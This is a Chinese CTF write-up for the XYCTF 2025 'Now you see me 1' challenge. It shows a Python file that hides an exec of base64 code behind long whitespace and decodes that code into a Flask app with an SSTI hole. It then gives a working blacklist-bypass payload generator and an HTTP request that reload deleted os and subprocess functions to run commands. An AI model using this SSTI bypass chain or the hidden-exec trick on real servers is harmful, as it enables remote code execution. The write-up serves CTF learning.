## [XYCTF 2025] Now you see me 1
太阴了，真正的源代码藏起来了
```python
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2024/12/27 18:27:15
@Author  :   LamentXU 

运行，然后你会发现启动了一个flask服务。这是怎么做到的呢？
注：本题为彻底的白盒题，服务端代码与附件中的代码一模一样。不用怀疑附件的真实性。
'''
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(__import__("base64").b64decode('IyBZT1UgRk9VTkQgTUUgOykKIyAtKi0gZW5jb2Rpbmc6IHV0Zi04IC0qLQonJycKQEZpbGUgICAgOiAgIHNyYy5weQpAVGltZSAgICA6ICAgMjAyNS8wMy8yOSAwMToxMDozNwpAQXV0aG9yICA6ICAgTGFtZW50WFUgCicnJwppbXBvcnQgZmxhc2sKaW1wb3J0IHN5cwplbmFibGVfaG9vayA9ICBGYWxzZQpjb3VudGVyID0gMApkZWYgYXVkaXRfY2hlY2tlcihldmVudCxhcmdzKToKICAgIGdsb2JhbCBjb3VudGVyCiAgICBpZiBlbmFibGVfaG9vazoKICAgICAgICBpZiBldmVudCBpbiBbImV4ZWMiLCAiY29tcGlsZSJdOgogICAgICAgICAgICBjb3VudGVyICs9IDEKICAgICAgICAgICAgaWYgY291bnRlciA+IDQ6CiAgICAgICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoZXZlbnQpCgpsb2NrX3dpdGhpbiA9IFsKICAgICJkZWJ1ZyIsICJmb3JtIiwgImFyZ3MiLCAidmFsdWVzIiwgCiAgICAiaGVhZGVycyIsICJqc29uIiwgInN0cmVhbSIsICJlbnZpcm9uIiwKICAgICJmaWxlcyIsICJtZXRob2QiLCAiY29va2llcyIsICJhcHBsaWNhdGlvbiIsIAogICAgJ2RhdGEnLCAndXJsJyAsJ1wnJywgJyInLCAKICAgICJnZXRhdHRyIiwgIl8iLCAie3siLCAifX0iLCAKICAgICJbIiwgIl0iLCAiXFwiLCAiLyIsInNlbGYiLCAKICAgICJsaXBzdW0iLCAiY3ljbGVyIiwgImpvaW5lciIsICJuYW1lc3BhY2UiLCAKICAgICJpbml0IiwgImRpciIsICJqb2luIiwgImRlY29kZSIsIAogICAgImJhdGNoIiwgImZpcnN0IiwgImxhc3QiICwgCiAgICAiICIsImRpY3QiLCJsaXN0IiwiZy4iLAogICAgIm9zIiwgInN1YnByb2Nlc3MiLAogICAgImd8YSIsICJHTE9CQUxTIiwgImxvd2VyIiwgInVwcGVyIiwKICAgICJCVUlMVElOUyIsICJzZWxlY3QiLCAiV0hPQU1JIiwgInBhdGgiLAogICAgIm9zIiwgInBvcGVuIiwgImNhdCIsICJubCIsICJhcHAiLCAic2V0YXR0ciIsICJ0cmFuc2xhdGUiLAogICAgInNvcnQiLCAiYmFzZTY0IiwgImVuY29kZSIsICJcXHUiLCAicG9wIiwgInJlZmVyZXIiLAogICAgIlRoZSBjbG9zZXIgeW91IHNlZSwgdGhlIGxlc3NlciB5b3UgZmluZC4iXSAKICAgICAgICAjIEkgaGF0ZSBhbGwgdGhlc2UuCmFwcCA9IGZsYXNrLkZsYXNrKF9fbmFtZV9fKQpAYXBwLnJvdXRlKCcvJykKZGVmIGluZGV4KCk6CiAgICByZXR1cm4gJ3RyeSAvSDNkZGVuX3JvdXRlJwpAYXBwLnJvdXRlKCcvSDNkZGVuX3JvdXRlJykKZGVmIHIzYWxfaW5zMWRlX3RoMHVnaHQoKToKICAgIGdsb2JhbCBlbmFibGVfaG9vaywgY291bnRlcgogICAgbmFtZSA9IGZsYXNrLnJlcXVlc3QuYXJncy5nZXQoJ015X2luczFkZV93MHIxZCcpCiAgICBpZiBuYW1lOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbmFtZS5zdGFydHN3aXRoKCJGb2xsb3cteW91ci1oZWFydC0iKToKICAgICAgICAgICAgICAgIGZvciBpIGluIGxvY2tfd2l0aGluOgogICAgICAgICAgICAgICAgICAgIGlmIGkgaW4gbmFtZToKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdOT1BFLicKICAgICAgICAgICAgICAgIGVuYWJsZV9ob29rID0gVHJ1ZQogICAgICAgICAgICAgICAgYSA9IGZsYXNrLnJlbmRlcl90ZW1wbGF0ZV9zdHJpbmcoJ3sjJytmJ3tuYW1lfScrJyN9JykKICAgICAgICAgICAgICAgIGVuYWJsZV9ob29rID0gRmFsc2UKICAgICAgICAgICAgICAgIGNvdW50ZXIgPSAwCiAgICAgICAgICAgICAgICByZXR1cm4gYQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuICdNeSBpbnNpZGUgd29ybGQgaXMgYWx3YXlzIGhpZGRlbi4nCiAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvciBhcyBlOgogICAgICAgICAgICBjb3VudGVyID0gMAogICAgICAgICAgICByZXR1cm4gJ05PLicKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJldHVybiAnRXJyb3InCiAgICBlbHNlOgogICAgICAgIHJldHVybiAnV2VsY29tZSB0byBIaWRkZW5fcm91dGUhJwoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGltcG9ydCBvcwogICAgdHJ5OgogICAgICAgIGltcG9ydCBfcG9zaXhzdWJwcm9jZXNzCiAgICAgICAgZGVsIF9wb3NpeHN1YnByb2Nlc3MuZm9ya19leGVjCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgaW1wb3J0IHN1YnByb2Nlc3MKICAgIGRlbCBvcy5wb3BlbgogICAgZGVsIG9zLnN5c3RlbQogICAgZGVsIHN1YnByb2Nlc3MuUG9wZW4KICAgIGRlbCBzdWJwcm9jZXNzLmNhbGwKICAgIGRlbCBzdWJwcm9jZXNzLnJ1bgogICAgZGVsIHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0CiAgICBkZWwgc3VicHJvY2Vzcy5nZXRvdXRwdXQKICAgIGRlbCBzdWJwcm9jZXNzLmNoZWNrX2NhbGwKICAgIGRlbCBzdWJwcm9jZXNzLmdldHN0YXR1c291dHB1dAogICAgZGVsIHN1YnByb2Nlc3MuUElQRQogICAgZGVsIHN1YnByb2Nlc3MuU1RET1VUCiAgICBkZWwgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IKICAgIGRlbCBzdWJwcm9jZXNzLlRpbWVvdXRFeHBpcmVkCiAgICBkZWwgc3VicHJvY2Vzcy5TdWJwcm9jZXNzRXJyb3IKICAgIHN5cy5hZGRhdWRpdGhvb2soYXVkaXRfY2hlY2tlcikKICAgIGFwcC5ydW4oZGVidWc9RmFsc2UsIGhvc3Q9JzAuMC4wLjAnLCBwb3J0PTUwMDApCg=='))                                                                 
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")                                                                 
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
```
这里看起来就是全是print但是，运行确实会启动一个flask服务，原来在后面，base64解码：
```python
# YOU FOUND ME ;)
# -*- encoding: utf-8 -*-
'''
@File    :   src.py
@Time    :   2025/03/29 01:10:37
@Author  :   LamentXU 
'''
import flask
import sys
enable_hook =  False
counter = 0
def audit_checker(event,args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)

lock_within = [
    "debug", "form", "args", "values", 
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application", 
    'data', 'url' ,'\'', '"', 
    "getattr", "_", "{{", "}}", 
    "[", "]", "\\", "/","self", 
    "lipsum", "cycler", "joiner", "namespace", 
    "init", "dir", "join", "decode", 
    "batch", "first", "last" , 
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\\u", "pop", "referer",
    "The closer you see, the lesser you find."] 
        # I hate all these.
app = flask.Flask(__name__)
@app.route('/')
def index():
    return 'try /H3dden_route'
@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    global enable_hook, counter
    name = flask.request.args.get('My_ins1de_w0r1d')
    if name:
        try:
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#'+f'{name}'+'#}')
                enable_hook = False
                counter = 0
                return a
            else:
                return 'My inside world is always hidden.'
        except RuntimeError as e:
            counter = 0
            return 'NO.'
        except Exception as e:
            return 'Error'
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.check_call
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)

```
debuff叠满了，审计钩子，把`_posixsubprocess.fork_exec`删了，还过滤这么一堆关键字，必须以`Follow-your-heart-`开头
我们首先想到的就是用object继承链去打，然后我们看看黑名单：
```python
lock_within = [
    "debug", "form", "args", "values",
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application",
    'data', 'url' ,'\'', '"',
    "getattr", "_", "{{", "}}",
    "[", "]", "\\", "/","self",
    "lipsum", "cycler", "joiner", "namespace",
    "init", "dir", "join", "decode",
    "batch", "first", "last" ,
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\\u", "pop", "referer",
    "The closer you see, the lesser you find."]
```
`{{`、`[`、`'`、`"`、`_`........感觉几乎都没了啊
打继承链得有`_`，这里还获取不了`request`的参数也都没了
![](assets/Day%208/file-20251226170048410.png)
### request模块获取任意字符
但是其实我们可以注意到，他为什么不是直接把`request`过滤，而是要禁他的一些方法的，就像它是在禁用get请求post请求，然后让我们找其他请求一样。
这里通过LAMENTXU师傅博客我又学到一招：
https://www.cnblogs.com/LAMENTXU/articles/18730353
![](assets/Day%208/file-20251226170102736.png)
可以使用`request.endpoint`获取到当前路由的函数名，即`r3al_ins1de_th0ught`
![](assets/Day%208/file-20251226170150733.png)
并且这个方法还有可以直接取到字符（下标从0开始）：
![](assets/Day%208/file-20251226170755236.png)
注意这里为什么要加一个`%23} (#})`呢，是因为源码中：
```python
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#'+f'{name}'+'#}')
                enable_hook = False
                counter = 0
                return a
```
题目是有回显的但是我们直接打没有回显，其实是因为渲染前加上了flask中的注释语句`{# #}`，所以我们构造一下闭合绕过

然后我们就可以去获取`data`了,这样我们就有了任意字符，并且可以通过`|attr`过滤器获取属性进行利用，这里有个技巧：
我之前总觉得`request.data`是从post请求获取数据，但是这里是get请求呀，尝试后发现get也行，只要你有`body`
所以`request.data`应该就是从body中获取数据吧，这里演示一下：
![](assets/Day%208/file-20251226173516118.png)
看到已经成功获取了
### 绕过审计钩子
这里把很多的rce函数给删掉了，
这里也很自然可以想到`方法重载`
==python2中可以使用reload函数对类进行重载，在python3中，这个函数搬到了importlib类里。可以以此重载到被删除的方法。==
效果就是：
![](assets/Day%208/file-20251226173854375.png)
我们把`os.system`删掉了但是又重载了一下，还是使用成功了。
最后我们可以写payload了，这里就直接用的LAMENTXU师傅的脚本：
```python
import re
payload = []
def generate_rce_command(cmd):
    global payload
    payloadstr = "{%set%0asub=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('subprocess')%}{%set%0aso=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(sub))%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(so))%}{%print(so|attr('popen')('" + cmd + "')|attr('read')())%}"

    required_encoding = re.findall('\'([a-z0-9_ /\.]+)\'', payloadstr)
    # print(required_encoding)

    offset_a = 16
    offset_0 = 6

    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                else:
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    # print(encoded_payloads)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    # print(fully_encoded_payload)
    payload.append(fully_encoded_payload)
command = "whoami"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
endpoint = 'r3al_ins1de_th0ught'
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
# Now we have "data"
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)
# payload.append(r'{%print(j)%}')
# Here we use the "data" to construct the payload
print('request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/')
# use chr() to convert the number to character
# hiahiahia~ Now we get all of the charset, SSTI go go go!


payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"Follow-your-heart-%23}"+output)


```
最后突然环境炸了反正应该执行系统命令了，就不搞了，这是env的payload：
```http
GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%for%0ai%0ain%0arequest.endpoint|slice(1)%}{%set%0adat=i.9~i.2~i.12~i.2%}{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}{%set%0aa0%0a=%0ak.16~k.31~k.31~k.27~k.24~k.18~k.16~k.35~k.24~k.30~k.29%}{%set%0aa1%0a=%0ak.2~k.2~k.22~k.27~k.30~k.17~k.16~k.27~k.34~k.2~k.2%}{%set%0aa2%0a=%0ak.2~k.2~k.22~k.20~k.35~k.24~k.35~k.20~k.28~k.2~k.2%}{%set%0aa3%0a=%0ak.2~k.2~k.17~k.36~k.24~k.27~k.35~k.24~k.29~k.34~k.2~k.2%}{%set%0aa4%0a=%0ak.2~k.2~k.24~k.28~k.31~k.30~k.33~k.35~k.2~k.2%}{%set%0aa5%0a=%0ak.34~k.36~k.17~k.31~k.33~k.30~k.18~k.20~k.34~k.34%}{%set%0aa6%0a=%0ak.30~k.34%}{%set%0aa7%0a=%0ak.24~k.28~k.31~k.30~k.33~k.35~k.27~k.24~k.17%}{%set%0aa8%0a=%0ak.33~k.20~k.27~k.30~k.16~k.19%}{%set%0aa9%0a=%0ak.31~k.30~k.31~k.20~k.29%}{%set%0aa10%0a=%0ak.20~k.29~k.37%}{%set%0aa11%0a=%0ak.33~k.20~k.16~k.19%}{%set%0asub=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a5)%}{%set%0aso=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a6)%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(sub))%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(so))%}{%print(so|attr(a9)(a10)|attr(a11)())%}{%endfor%}{%endfor%} HTTP/1.1
Host: challenge.imxbt.cn:30680/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

_ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/

```
最后获得flag文件后是一个音频文件，还考到了隐写，加上环境问题就没去搞了。